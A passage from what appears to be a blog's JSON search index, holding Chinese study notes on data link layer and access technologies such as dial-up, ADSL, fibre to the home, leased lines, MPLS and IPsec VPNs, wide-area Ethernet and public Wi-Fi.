的缩写,意为高清晰度多媒体接口。它可以通过一根缆线实现图像和声音等数字信号的高品质传输。曾主要用于DVD/蓝光播放器、录像机、AV 功放等设备与电视机、投影仪的连接,现在也逐渐开始用于计算机或平板电脑、数码相机与显示器的连接。从2009年发布的1.4 版开始它可以传输以太网帧,使得采用 HDMI介质实现 TCP/IP通信变为可能。\n公共网络 模拟电话线路 模拟电话线路其实就是利用固定电话线路进行通信。电话线中的音频带宽用于拔号上网。该方法不需要特殊的通信线路,完全使用已普及的电话网。 让计算机与电话线相连需要有一个将数字信号转换为模拟信号的调制解调器(俗称“猫”)。“猫”的传输速率一般只在56kbps 左右,所以现在已逐渐被淘汰。 （时代的眼泪）\nADSL ADSL’是对已有的模拟电话线路进行扩展的一种服务。模拟电话线路虽然也能传输高频数字通信,但是它与电信局的交换机之间只有发送音频信号时才能显示极好的传输效率,并会对其他多余频率的信号进行丢弃。\nADSL 正是利用话机到电信局交换机之间这段线路,附加一个叫做分离器的装置,将音频信号(低频信号)和数字信号(高频信号)隔离以免产生噪声干扰。\nFTTH FTTH(Fiber To The Home)顾名思义就是一根高速光纤直接连到用户家里或公司建筑物处的方法。它通过一个叫做ONU\u0026rsquo;的装置将计算机与之关连。该装置负责在光信号与电子信号之间的转换。使用FITH可以实现稳定的高速通信。不过它的线路传输速率与具体的服务内容仍受个别运营商限制。\n以上属于光纤到户。还有一种方式叫光纤到楼。它是指一个高速光纤直接连到某个大厦、公司或宾馆的大楼,随后在整个大楼内部再通过布线实现联网。简称FTTB(Fiber To The Building)。甚至还有一种方式是将光纤接人到某个家庭以后,再通过布线实现周围几户住家共同联网。这种方式简称为 FTIC (Fiber To The Curb\u0026rsquo;)。 有线电视 专线 随着互联网用户的急剧上升,专线服务向着价格更低、带宽更广以及多样化的方向发展。现在市面上已经出现了各种各样的“专线服务”。以NTT Group 的服务为例,有 Mega Data Nets(用 ATM 接口提供3Mbps~42Mbps 的专线接人)、ATM Mega-Link、Giga Stream(用以太网或 SONET/SDH 接口提供 0.5Mbps~135Mbps 的专线接人)等众多专线接入服务。\n专线的连接一定是一对一的连接。虽然 [[#ATM]] 的设计初衷允许有多个目标地, 但对于提供专线服务的ATMMega-Link中也只能指定一个目的地。因此不可能像ISDN 或帧中继那样引进一条线缆就能连接众多目的地。\nVPN 虚拟专用网络(VPN)用于连接距离较远的地域。这种服务包括 IP-VPN 和广域以太网。\nIP-VPN 意指在IP 网络(互联网)上建立 VPN。 网络服务商提供一种在 IP 网络上使用 MPIS 技术构建 VPN 的服务。其中MPLS(Multiprotocol Label Switching,多协议标签交换)在IP 包中附加一个叫做标签(Label\u0026rsquo;)的信息进行传输控制。每个用户的标签信息不同,因此在通过MPIS 网时,可以轻松地判断出目标地址。这样一来就可以将多个不同用户的VPN信息通过 MPLS 网加以区分,形成封闭的私有网络。此外,还能进行用户级的带宽控制。\nIPsec 除了使用服务提供商的 IP-VPN服务之外,有时企业还可以在互联网上建立自己的VPN\u0026rsquo;,一般采用的是 IPsec’技术。该方法对 VPN通信中的IP 包进行验证和加密,在互联网上构造一个封闭的私有网络。\n广域以太网 服务提供商所提供的用于连接相距较远的地域的一种服务。IP-VPN 是在IP 层面的连接,广域以太网则是在作为数据链路层的以太网上利用VLAN(虚拟局域网)实现 VPN的技术。该技术还可以使用 TCP/IP 中的其他协议。 广域以太网以企业专门使用服务提供商构建的 VLAN 网络为主要形式。只要指定同一个 VLAN,无论从哪里都能接入到同一个网络。\n公共无线 LAN 公共无线LAN 是指公开的可以使用[Wi-Fi]的服务。服务提供者可以在车站或餐饮店等人员相对比较集中的地方架设的一个叫做热点(HotSpot)的无线电波接收器。使用者到达这些区域就可以使用带有无线LAN网卡的笔记本电脑或智能手机连接上网。\n上网时使用者首先要通过这些热点建立互联网连接。连接以后,还可以通过那些利用 IPsec技术实现的VPN 连接到自己公司的内网。这种接人服务有时免费(如商场、车站等场所),有时也可能是收费的。 ","date":"2023-10-18T18:52:01+08:00","permalink":"https://anonymity-0.github.io/posts/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/","title":"数据链路层"}]